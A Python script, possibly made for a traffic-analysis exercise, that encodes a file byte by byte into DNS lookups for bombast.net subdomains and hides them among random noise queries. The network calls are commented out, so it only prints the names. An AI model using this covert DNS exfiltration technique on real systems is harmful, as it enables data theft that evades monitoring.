import socket
import random
import os, binascii

MAX_NOISE_COUNT = 3
DOMAIN = "bombast.net"
FLAG = 'a'



def main():
    f = open('QRcode.bmp', 'r')
    payload = f.read();
    f.close();

    message = '\S' + payload + '\E'
    message = message.encode()
    print(message)

    # Loop through and send message
    for b in range(len(message)):

        malicious = '-' + get_rand_nibble() + FLAG + get_rand_byte() + format(message[b], 'x') + get_rand_nibble() + '.' + DOMAIN

        # inject 1 to X amounts of noise into the pipe
        for i in range(random.randint(1, MAX_NOISE_COUNT)):
            req = get_noise() + '.' + DOMAIN
            print(req)
            #socket.gethostbyname(req)

        # inject our payload
        print(malicious)
        #socket.gethostbyname(malicious)

        # inject 0 to X amounts of noise into the pipe
        for i in range(random.randint(0, MAX_NOISE_COUNT)):
            req = get_noise() + '.' + DOMAIN
            print(req)
            #socket.gethostbyname(req)


def get_noise():
    noise = ''.join(random.choice('0123456789abcdef') for n in range(1)) #a included
    noise = noise + ''.join(random.choice('0123456789bcdef') for n in range(1)) #a excluded
    noise = noise + ''.join(random.choice('0123456789abcdef') for n in range(5)) #a included
    return noise

def get_rand_nibble():
    return binascii.b2a_hex(os.urandom(1)).decode()[0]

def get_rand_byte():
    return binascii.b2a_hex(os.urandom(1)).decode()



# run the program
main()
